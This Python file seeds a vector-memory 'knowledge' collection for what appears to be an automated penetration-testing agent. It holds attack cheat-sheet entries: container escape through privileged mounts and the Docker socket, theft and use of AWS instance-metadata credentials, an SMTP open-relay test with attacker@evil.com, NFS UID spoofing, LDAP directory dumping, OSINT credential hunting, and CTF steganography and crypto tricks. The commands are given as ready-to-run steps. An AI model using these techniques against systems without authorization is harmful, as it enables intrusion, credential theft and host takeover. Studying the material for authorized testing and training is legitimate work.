            "  ffuf -w subdomains.txt:FUZZ -u http://FUZZ.example.com -fc 301,302\n"
            "  dnsx -l subs.txt -resp -a -aaaa -cname  (resolve + check live)\n"
            "Virtual host fuzzing:\n"
            "  ffuf -w subdomains.txt:FUZZ -u http://<ip>/ -H 'Host: FUZZ.example.com' -fs <baseline_size>\n"
            "Zone transfer attempt: dig axfr @<nameserver> example.com"
        ),
        "metadata": {"category": "recon", "technique": "subdomain-enum", "tool": "subfinder"},
    },
    {
        "id": "recon-osint-tools",
        "content": (
            "OSINT: external reconnaissance tools\n"
            "Shodan (internet-connected device search):\n"
            "  shodan host <ip>  (full host info)\n"
            "  shodan search 'org:\"Company Name\" port:22'\n"
            "  shodan search 'ssl.cert.subject.CN:example.com'\n"
            "theHarvester (emails, subdomains, names):\n"
            "  theHarvester -d example.com -b all -l 200\n"
            "  Sources: google, bing, linkedin, crtsh, github, hunter, securitytrails\n"
            "Hunter.io: find company email format, employee emails\n"
            "LinkedIn: enumerate employees, technology stack from job postings\n"
            "GitHub: search org repos for credentials, API keys\n"
            "  github.com/search?q=org%3Acompanyname+password&type=code\n"
            "Wayback Machine: archived pages with old creds, API keys, subdomains\n"
            "  web.archive.org/web/*/example.com/*\n"
            "Google dorks: site:example.com filetype:pdf  site:example.com inurl:admin"
        ),
        "metadata": {"category": "recon", "technique": "osint", "tool": "shodan"},
    },

    # ── CTF-Specific Techniques ───────────────────────────────────────────────

    {
        "id": "ctf-steganography",
        "content": (
            "CTF: Steganography tools and techniques\n"
            "Initial analysis of any file:\n"
            "  file <file>  (identify true type)\n"
            "  strings <file> | less  (look for readable text)\n"
            "  binwalk <file>  (detect embedded files)\n"
            "  binwalk -e <file>  (extract embedded files)\n"
            "  xxd <file> | head  (hex dump header)\n"
            "  exiftool <file>  (all metadata)\n"
            "Images:\n"
            "  steghide extract -sf image.jpg  (try blank password first)\n"
            "  stegseek image.jpg /usr/share/wordlists/rockyou.txt  (brute force steghide)\n"
            "  zsteg image.png  (LSB steganography in PNG)\n"
            "  stegsolve image.png  (visual analysis, color plane inspection)\n"
            "Audio (WAV/MP3):\n"
            "  Audacity: look for hidden data in spectrogram view\n"
            "  sonic-visualiser: spectrogram analysis\n"
            "  mp3stego: mp3stego-decode -X -P password file.mp3 out.txt\n"
            "ZIP with password: john zip.hash or hashcat -m 17200"
        ),
        "metadata": {"category": "ctf", "technique": "steganography", "tool": "steghide"},
    },
    {
        "id": "ctf-common-patterns",
        "content": (
            "CTF: Common web and source disclosure patterns\n"
            ".git directory exposure:\n"
            "  curl http://<host>/.git/HEAD  (if returns 'ref: refs/heads/main' → exposed)\n"
            "  git-dumper http://<host>/.git/ ./repo  (download full repo)\n"
            "  git log --all --oneline  (check for deleted sensitive files)\n"
            "  git show <commit>:<file>  (recover deleted content)\n"
            "robots.txt and sitemap:\n"
            "  curl http://<host>/robots.txt  — disallowed paths often lead to flags\n"
            "  curl http://<host>/sitemap.xml\n"
            "Source backup files: index.php.bak, index.php~, .index.php.swp, index.php.old\n"
            "  ffuf -w extensions.txt:EXT -u http://<host>/index.phpEXT\n"
            "PHP info: /phpinfo.php, /info.php, /php_info.php\n"
            "Config files: /config.php, /.env, /config.yml, /application.properties\n"
            "Swagger/API docs: /swagger.json, /openapi.json, /api-docs, /v2/api-docs"
        ),
        "metadata": {"category": "ctf", "technique": "web-recon", "tool": "git-dumper"},
    },
    {
        "id": "ctf-crypto-basics",
        "content": (
            "CTF: Crypto identification and quick decodes\n"
            "Base64: ends in = or ==, charset A-Za-z0-9+/\n"
            "  echo '<string>' | base64 -d\n"
            "Base32: uppercase A-Z and 2-7, ends in =\n"
            "  echo '<string>' | base32 -d\n"
            "ROT13: letter substitution cipher\n"
            "  echo '<string>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n"
            "Caesar cipher: try all 25 rotations\n"
            "  python3 -c \"s='<string>'; [print(i,''.join(chr((ord(c)-65+i)%26+65) if c.isupper() else chr((ord(c)-97+i)%26+97) if c.islower() else c for c in s)) for i in range(26)]\"\n"
            "Vigenere: use dcode.fr or crackvigenere tool\n"
            "XOR with single byte:\n"
            "  python3 -c \"data=bytes.fromhex('<hex>'); [print(i, bytes([b^i for b in data])) for i in range(256)]\"\n"
            "Hash length extension: hashpump tool\n"
            "RSA weak keys: RsaCtfTool.py — factor small n, common modulus, wiener"
        ),
        "metadata": {"category": "ctf", "technique": "crypto", "tool": "python3"},
    },

    # ── Cloud and Container Escape ────────────────────────────────────────────

    {
        "id": "docker-escape",
        "content": (
            "Docker container escape techniques\n"
            "Check if inside container: cat /.dockerenv  OR  ls /.dockerenv (file exists in containers)\n"
            "Check privileges: cat /proc/self/status | grep CapEff (all f's = fully privileged)\n"
            "Privileged container escape:\n"
            "  fdisk -l  (list host disks)\n"
            "  mkdir /mnt/host; mount /dev/sda1 /mnt/host\n"
            "  chroot /mnt/host /bin/bash  →  full host filesystem\n"
            "Docker socket escape (if /var/run/docker.sock mounted):\n"
            "  ls -la /var/run/docker.sock  (if accessible → full Docker API access)\n"
            "  docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh\n"
            "  (starts new privileged container with host filesystem mounted)\n"
            "Cgroup escape (privileged, release_agent technique):\n"
            "  Check: cat /proc/1/cgroup | grep docker\n"
            "  Use: https://github.com/stealthcopter/deepce\n"
            "Tool: deepce.sh (comprehensive container escape checker)"
        ),
        "metadata": {"category": "privesc", "technique": "container-escape", "tool": "docker"},
    },
    {
        "id": "cloud-aws-metadata",
        "content": (
            "Cloud: AWS metadata credential theft (IMDSv1)\n"
            "Requires: SSRF or shell access inside an EC2 instance\n"
            "Check if IMDSv1 (unauthenticated) is enabled:\n"
            "  curl http://169.254.169.254/latest/meta-data/\n"
            "Get IAM role name:\n"
            "  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "Get temporary credentials:\n"
            "  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>\n"
            "  Returns: AccessKeyId, SecretAccessKey, Token\n"
            "Use stolen credentials:\n"
            "  export AWS_ACCESS_KEY_ID=<key>\n"
            "  export AWS_SECRET_ACCESS_KEY=<secret>\n"
            "  export AWS_SESSION_TOKEN=<token>\n"
            "  aws sts get-caller-identity  (verify who you are)\n"
            "  aws s3 ls  /  aws iam list-users  /  aws ec2 describe-instances\n"
            "IMDSv2 (token required): curl -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds:21600' http://169.254.169.254/latest/api/token"
        ),
        "metadata": {"category": "cloud", "technique": "metadata-ssrf", "tool": "curl"},
    },

    # ── Network Service Enumeration ───────────────────────────────────────────

    {
        "id": "enum-smtp",
        "content": (
            "SMTP enumeration and exploitation\n"
            "Banner grab: nc <host> 25\n"
            "User enumeration (VRFY/EXPN/RCPT TO):\n"
            "  smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <host>\n"
            "  smtp-user-enum -M RCPT -U users.txt -D example.com -t <host>\n"
            "Open relay test (can spam without auth):\n"
            "  telnet <host> 25\n"
            "  EHLO test\n"
            "  MAIL FROM: attacker@evil.com\n"
            "  RCPT TO: victim@victim.com  (if accepted → open relay)\n"
            "Nmap scripts:\n"
            "  nmap --script smtp-enum-users,smtp-open-relay -p 25 <host>\n"
            "Sendmail log disclosure: try VRFY root, VRFY nobody\n"
            "Swaks (send test emails): swaks --to victim@example.com --from spoof@example.com --server <host>"
        ),
        "metadata": {"category": "recon", "technique": "enumeration", "service": "smtp", "port": "25"},
    },
    {
        "id": "enum-nfs",
        "content": (
            "NFS enumeration\n"
            "List exports from attacker:\n"
            "  showmount -e <host>\n"
            "  nmap --script nfs-showmount -p 111,2049 <host>\n"
            "Mount share:\n"
            "  mkdir /mnt/nfs; mount -t nfs <host>:/share /mnt/nfs\n"
            "  mount -o vers=3 <host>:/share /mnt/nfs  (force NFSv3 if v4 fails)\n"
            "List files including hidden:\n"
            "  ls -la /mnt/nfs\n"
            "Check for world-readable sensitive files: .ssh/, .bash_history, config files\n"
            "UID manipulation (if no_root_squash): create user with matching UID on attacker\n"
            "  useradd -u 1001 targetuser\n"
            "  su targetuser; ls -la /mnt/nfs  (now accessing as that UID)"
        ),
        "metadata": {"category": "recon", "technique": "enumeration", "service": "nfs", "port": "2049"},
    },
    {
        "id": "enum-ldap",
        "content": (
            "LDAP enumeration (often open on domain controllers port 389/636)\n"
            "Anonymous bind test:\n"
            "  ldapsearch -x -H ldap://<host> -b '' -s base '(objectClass=*)'\n"
            "Dump everything (anonymous):\n"
            "  ldapsearch -x -H ldap://<host> -b 'dc=example,dc=com'\n"
            "With credentials:\n"
            "  ldapsearch -x -H ldap://<host> -D 'user@example.com' -w 'Password' -b 'dc=example,dc=com'\n"
            "Enumerate users:\n"
            "  ldapsearch -x -H ldap://<host> -b 'dc=example,dc=com' '(objectClass=user)' sAMAccountName userPrincipalName\n"
            "Enumerate groups:\n"
            "  ldapsearch -x -H ldap://<host> -b 'dc=example,dc=com' '(objectClass=group)' cn member\n"
            "Find admins:\n"
            "  ldapsearch -x -H ldap://<host> -b 'CN=Domain Admins,CN=Users,dc=example,dc=com'\n"
            "Tool: ldapdomaindump (outputs HTML/JSON): ldapdomaindump -u 'domain\\user' -p pass <host>"
        ),
        "metadata": {"category": "recon", "technique": "enumeration", "service": "ldap", "port": "389"},
    },

]


def seed(memory: "VectorMemory") -> None:
    """Upsert any missing knowledge entries. Safe to call from scripts or tests."""
    current = memory.count("knowledge")
    if current >= len(ENTRIES):
        return
    for entry in ENTRIES:
        memory.store(
            collection="knowledge",
            content=entry["content"],
            metadata=entry["metadata"],
            doc_id=entry["id"],
        )


def main() -> None:
    mem = VectorMemory(persist_dir="./work/memory")
    for i, entry in enumerate(ENTRIES, 1):
        mem.store(
            collection="knowledge",
            content=entry["content"],
            metadata=entry["metadata"],
            doc_id=entry["id"],
        )
        if i % 10 == 0:
            print(f"  {i}/{len(ENTRIES)} entries stored...")

    print(f"\nSeeded {len(ENTRIES)} knowledge entries into ChromaDB 'knowledge' collection.")
    print("Run verification: python -c \"")
    print("from konr.storage.memory import VectorMemory")
    print("m = VectorMemory('./work/memory')")
    print("r = m.search('knowledge', 'bash suid escalation', n_results=2)")
    print("print(r[0]['content'][:200] if r else 'No results')")
    print("\"")


if __name__ == "__main__":
    main()
